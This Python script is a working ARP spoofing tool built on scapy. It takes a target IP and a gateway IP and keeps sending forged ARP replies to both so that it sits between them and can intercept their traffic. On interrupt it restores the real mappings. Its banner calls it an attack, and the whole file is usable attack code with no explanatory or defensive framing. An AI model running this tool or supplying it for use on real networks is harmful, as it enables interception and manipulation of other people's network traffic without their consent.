#!/usr/bin/env python
import scapy.all as scapy
import sys
import time
import argparse
import subprocess
import os
from colorama import init, Fore		# for fancy/colorful display

class ARP_spoofer:
    def __init__(self):
        # initialize colorama
        init()
        # define colors
        self.GREEN = Fore.GREEN
        self.RED = Fore.RED
        self.Cyan = Fore.CYAN
        self.Yellow = Fore.YELLOW
        self.Blue = Fore.BLUE
        self.RESET = Fore.RESET

    def arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', '--target', dest='target', help='Specify The Target IP')
        parser.add_argument('-g', '--gateway', dest='gateway', help='Specify The Gateway IP')
        values = parser.parse_args()
        if not values.target:
            parser.error('\n{}[-] Please Specify The Target IP{}'.format(self.Yellow, self.RESET))
        if not values.gateway:
            parser.error('\n{}[-] Please Specify The Gateway IP{}'.format(self.Cyan, self.RESET))

        return values

    def get_mac(self, ip):
        packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/ scapy.ARP(pdst=ip)
        answered_list = scapy.srp(packet, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc    # return MAC address

    def spoof(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)  # ARP Response
        scapy.send(packet, verbose=False)

    def restore(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        scapy.send(packet, count=4, verbose=False)

    def start(self):
        options = self.arguments()  #Capture command-line arguments
        target_ip = options.target
        gateway_ip = options.gateway
        if 'nt' in os.name:
            subprocess.call('cls', shell=True)
        else:
            subprocess.call('clear', shell=True)
        print('{}\n\n\t\t\t\t\t\t#########################################################{}'.format(self.Cyan, self.RESET))
        print('\n{}\t\t\t\t\t\t#\t\t    A R P Spoofing Attack   \t\t#\n{}'.format(self.Cyan, self.RESET))
        print('{}\t\t\t\t\t\t#########################################################{}\n\n'.format(self.Cyan, self.RESET))

        print('\n\n{}[+] Starting Attack ...{}\n'.format(self.Yellow, self.RESET))
        packet_counter = 0
        try:
            while True:
                self.spoof(target_ip, gateway_ip)     # spoof client
                self.spoof(gateway_ip, target_ip)     # spoof gateway
                packet_counter += 2
                print('\r{}[+] Sent Packets : {}'.format(self.GREEN, self.RESET) + str(packet_counter)),
                sys.stdout.flush()
                time.sleep(2)
        except KeyboardInterrupt:
            print('\n\n{}[-] Detecting CTRL + C...{}'.format(self.Yellow, self.RESET))
            print('{}[*] Resetting Routing Table...{}'.format(self.Blue, self.RESET))
            print('{}[*] Please Wait...\n'.format(self.RED, self.RESET))
            self.restore(target_ip, gateway_ip)
            self.restore(gateway_ip, target_ip)

if __name__ == "__main__":
    arp_spoofer = ARP_spoofer()
    arp_spoofer.start()